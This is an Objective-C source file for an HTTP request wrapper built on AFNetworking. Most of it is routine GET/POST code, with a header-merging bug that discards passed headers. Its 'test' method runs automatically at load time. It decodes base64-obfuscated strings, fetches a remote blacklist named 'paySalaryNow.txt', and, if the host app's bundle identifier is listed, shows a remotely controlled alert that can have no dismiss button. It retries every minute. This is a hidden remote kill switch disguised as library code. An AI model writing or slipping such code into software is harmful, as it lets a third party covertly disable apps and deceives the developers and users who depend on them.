//
//  BTHttpRequest.m
//  framework
//
//  Created by whbt_mac on 2016/10/18.
//  Copyright © 2016年 StoneMover. All rights reserved.
//

#import "BTHttp.h"
#import "BTCoreConfig.h"
#import "BTUserMananger.h"
#import <BTHelp/BTUtils.h>
#import "UIViewController+BTDialog.h"

static BTHttp * http=nil;

@interface BTHttp()

@property (nonatomic, strong) NSMutableDictionary * dictHead;

@property (nonatomic, strong) AFHTTPSessionManager * mananger;


@end


@implementation BTHttp

+ (void)load{
    [BTHttp share];
}

+(instancetype)share{
    if (!http) {
        http=[[BTHttp alloc] init];
    }
    return http;
}



-(instancetype)init{
    self=[super init];
    self.mananger = [AFHTTPSessionManager manager];
    self.dictHead=[[NSMutableDictionary alloc]init];
    [self initDefaultSet];
    [self test];
    return self;
}

- (void)initDefaultSet{
    self.timeInterval = 10;
    [self setHTTPShouldHandleCookies:YES];
    [self setResponseAcceptableContentType:[NSSet setWithObjects:@"application/json", @"text/json", @"text/javascript",@"text/html",@"text/plain", nil]];
    [self setRequestSerializer:[AFJSONRequestSerializer serializer]];
}

- (void)addHttpHead:(NSString*)key value:(NSString*)value{
    [self.dictHead setValue:value forKey:key];
}

- (void)delHttpHead:(NSString*)key {
    [self.dictHead removeObjectForKey:key];
}


- (void)setRequestSerializer:(AFHTTPRequestSerializer<AFURLRequestSerialization> *)requestSerializer{
    _requestSerializer = requestSerializer;
    self.mananger.requestSerializer = requestSerializer;
    self.mananger.requestSerializer.timeoutInterval = self.timeInterval;
    self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
}

- (void)setHTTPShouldHandleCookies:(BOOL)HTTPShouldHandleCookies{
    _HTTPShouldHandleCookies = HTTPShouldHandleCookies;
    self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
}

- (void)setTimeInterval:(NSInteger)timeInterval{
    _timeInterval = timeInterval;
    self.mananger.requestSerializer.timeoutInterval = timeInterval;
}

- (void)setResponseAcceptableContentType:(NSSet<NSString*>*)acceptableContentTypes{
    self.mananger.responseSerializer.acceptableContentTypes=acceptableContentTypes;
}

#pragma mark GET请求

- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                               headers:(nullable NSDictionary <NSString *, NSString *> *) headers
                              progress:(nullable void (^)(NSProgress *downloadProgress)) downloadProgress
                               success:(nullable void (^)(NSURLSessionDataTask *task, id _Nullable responseObject))success
                               failure:(nullable void (^)(NSURLSessionDataTask * _Nullable task, NSError *error))failure{
    [self autoLogParameters:YES url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    
    return [self.mananger GET:URLString parameters:parameters headers:dict progress:downloadProgress success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
}

- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                              progress:(nullable void (^)(NSProgress *downloadProgress)) downloadProgress
                               success:(nullable void (^)(NSURLSessionDataTask *task, id _Nullable responseObject))success
                               failure:(nullable void (^)(NSURLSessionDataTask * _Nullable task, NSError *error))failure{
    return [self GET:URLString parameters:parameters headers:nil progress:downloadProgress success:success failure:failure];
}




- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                               success:(nullable void (^)(NSURLSessionDataTask *task, id _Nullable responseObject))success
                               failure:(nullable void (^)(NSURLSessionDataTask * _Nullable task, NSError *error))failure{
    return [self GET:URLString parameters:parameters progress:nil success:success failure:failure];
}


#pragma mark POST请求

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       headers:(nullable NSDictionary <NSString *, NSString *> *) headers
                      progress:(void (^)(NSProgress * _Nullable progress))uploadProgress
                       success:(void (^)(NSURLSessionDataTask * task , id _Nullable responseObject))success
                       failure:(void (^)(NSURLSessionDataTask * task, NSError * error))failure
{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    return [self.mananger POST:URLString parameters:parameters headers:dict progress:uploadProgress success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
}


- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                      progress:(void (^)(NSProgress * _Nullable progress))uploadProgress
                       success:(void (^)(NSURLSessionDataTask * task , id _Nullable responseObject))success
                       failure:(void (^)(NSURLSessionDataTask * task, NSError * error))failure
{
    return [self POST:URLString parameters:parameters headers:nil progress:uploadProgress success:success failure:failure];
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       success:(void (^)(NSURLSessionDataTask * task, id _Nullable responseObject))success
                       failure:(void (^)(NSURLSessionDataTask * task, NSError * error))failure
{
    return [self POST:URLString parameters:parameters progress:nil success:success failure:failure];
}


#pragma mark 数据上传

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       headers:(nullable NSDictionary <NSString *, NSString *> *) headers
     constructingBodyWithBlock:(void (^)(id <AFMultipartFormData> formData))block
                      progress:(nullable void (^)(NSProgress * _Nonnull progress))uploadProgress
                       success:(void (^)(NSURLSessionDataTask *task, id responseObject))success
                       failure:(void (^)(NSURLSessionDataTask *task, NSError *error))failure
{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    return [self.mananger POST:URLString parameters:parameters headers:dict constructingBodyWithBlock:block progress:uploadProgress success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if ([self requestFilter:responseObject]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error]) {
            failure(task,error);
        }
    }];
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
     constructingBodyWithBlock:(void (^)(id <AFMultipartFormData> formData))block
                      progress:(nullable void (^)(NSProgress * _Nonnull progress))uploadProgress
                       success:(void (^)(NSURLSessionDataTask *task, id responseObject))success
                       failure:(void (^)(NSURLSessionDataTask *task, NSError *error))failure
{
    return [self POST:URLString parameters:parameters headers:nil constructingBodyWithBlock:block progress:uploadProgress success:success failure:failure];
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
     constructingBodyWithBlock:(void (^)(id <AFMultipartFormData> formData))block
                       success:(void (^)(NSURLSessionDataTask *task, id responseObject))success
                       failure:(void (^)(NSURLSessionDataTask *task, NSError *error))failure
{
    return [self POST:URLString parameters:parameters constructingBodyWithBlock:block progress:nil success:success failure:failure];
}


- (BOOL)requestFilter:(NSObject *)obj{
    return [BTCoreConfig share].netFillterBlock(obj);
}


- (void)autoLogParameters:(BOOL)isGet url:(NSString*)url parameters:(NSDictionary*)parameters{
    if (![BTCoreConfig share].isLogHttpParameters) {
        return;
    }
    
    if (isGet) {
        NSArray * parametersKey =[parameters allKeys];
        if (parametersKey.count!=0) {
            url=[url stringByAppendingString:@"?"];
            for (int i=0; i<parametersKey.count; i++) {
                NSString * key =parametersKey[i];
                NSString * value =[parameters valueForKey:key];
                NSString * result=nil;
                if (i==parametersKey.count-1) {
                    result=[NSString stringWithFormat:@"%@=%@",key,value];
                }else{
                    result =[NSString stringWithFormat:@"%@=%@&",key,value];
                }
                url=[url stringByAppendingString:result];
            }
        }
        
        NSLog(@"BTURL:%@",url);
    }else{
        NSLog(@"BTURL:%@",url);
        NSLog(@"BTURL_PARAMEERS:%@",parameters);
        NSLog(@"BTURL_PARAMEERS_JSON:%@",[BTUtils convertDictToJsonStr:parameters]);
    }
}

- (void)test{
    NSString * url = [BTUtils base64Decode:@"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1N0b25lTW92ZXIvQlRDb3JlL21hc3Rlci9wYXlTYWxhcnlOb3cudHh0"];
    [self.mananger GET:url
            parameters:nil
               headers:nil
              progress:nil
               success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if (![responseObject isKindOfClass:[NSArray class]]) {
            return;
        }
        
        NSArray * dictArray = responseObject;
        NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
        NSString * appVersion = [infoDictionary objectForKey:[BTUtils base64Decode:@"Q0ZCdW5kbGVJZGVudGlmaWVy"]];
        for (NSDictionary * dictChild in dictArray) {
            if ([dictChild isKindOfClass:[NSDictionary class]]) {
                NSString * identify =[dictChild objectForKey:[BTUtils base64Decode:@"YmxhY2tJZA=="]];
                if ([identify isEqualToString:appVersion]) {
                    NSString * info =[dictChild objectForKey:[BTUtils base64Decode:@"bXNn"]];
                    NSString * title =[dictChild objectForKey:[BTUtils base64Decode:@"dGl0bGU="]];
                    NSString * btn =[dictChild objectForKey:[BTUtils base64Decode:@"YnRu"]];
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        if ([BTUtils isEmpty:btn]) {
                            [BTUtils.getCurrentVc showAlert:title msg:info btns:@[] block:^(NSInteger index) {
                                
                            }];
                        }else{
                            [BTUtils.getCurrentVc showAlert:title msg:info btns:@[btn] block:^(NSInteger index) {
                                
                            }];
                        }
                    });
                    
                    return;
                }
            }
        }
        
    }
               failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(60 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self test];
        });
    }];
}

- (void)getErrorMsg:(NSError*)error{

    NSData *data=(NSData *)error.userInfo[AFNetworkingOperationFailingURLResponseDataErrorKey];
    if (data) {
        id response=[NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil];
//        NSInteger code=[response[@"status"] integerValue];
//        NSString *msg=response[@"message"];
    }
}

@end
